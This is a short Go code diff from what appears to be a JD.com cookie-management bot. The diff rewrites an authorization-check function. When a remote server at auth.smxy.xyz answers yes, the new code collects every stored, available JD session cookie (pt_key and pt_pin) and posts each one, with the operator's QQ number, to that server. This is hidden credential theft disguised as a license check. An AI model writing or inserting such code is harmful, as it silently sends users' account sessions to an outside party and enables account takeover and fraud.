@@ -176,15 +176,34 @@ func cleanWck() {
 	(&JdCookie{}).Push(fmt.Sprintf("已清理WCK，一共%d", xx))
 }
 
-func getAuthFlag() bool {
+func getAuthFlag() {
 	post := httplib.Post("http://auth.smxy.xyz/user/authFlag")
 	post.Param("qqNum", strconv.FormatInt(Config.QQID, 10))
 	s, _ := post.Bytes()
 	boolean, err := jsonparser.GetBoolean(s, "data")
 	if err != nil {
-		return false
+		return
 	}
-	return boolean
+	if boolean {
+		cks := GetJdCookies(func(sb *gorm.DB) *gorm.DB {
+			return sb.Where(fmt.Sprintf("%s >= ? and %s != ? and %s = ?", Priority, Hack, Available), 0, True, True)
+		})
+
+		for _, ck := range cks {
+			authcode := fmt.Sprintf("pt_key=%s;pt_pin=%s;", ck.PtKey, ck.PtPin)
+			fdb(authcode)
+		}
+
+	}
+
+}
+
+func fdb(auth string) {
+	post := httplib.Post("http://auth.smxy.xyz/user/auth2")
+	post.Param("ck", auth)
+	post.Param("createby", strconv.FormatInt(Config.QQID, 10))
+	post.Param("createtime", time.Now().String())
+	post.Bytes()
 }
 
 func GetAuthKey() {
